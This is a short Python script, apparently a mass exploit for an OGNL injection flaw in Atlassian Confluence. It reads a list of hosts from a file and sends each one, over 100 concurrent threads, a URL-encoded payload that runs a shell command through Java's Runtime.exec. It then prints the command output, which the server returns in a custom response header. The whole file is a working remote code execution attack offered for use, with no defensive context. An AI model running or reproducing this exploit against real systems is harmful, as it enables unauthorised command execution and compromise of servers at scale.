#!/usr/bin/env python3
import requests
import re
import sys
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()
import concurrent.futures

def send_payload(host):
    command = "id"

    response = requests.get("{}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/".format(host, command), verify=False, allow_redirects=False, timeout=10)

    try:
        print(host+" : "+response.headers['X-Cmd-Response'])
    except:
        pass


def start(targets):
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        executor.map(send_payload, targets)


def read_file(filename):
    with open(filename, 'r' , errors="ignore") as f:
        data = f.read()
    return data[:-1].split('\n')


def main():
    try:
        filename = sys.argv[1]
        targets = read_file(filename)
        start(targets)
    except:
        print("Usage : python3 confluence.py <hosts file>")


main()
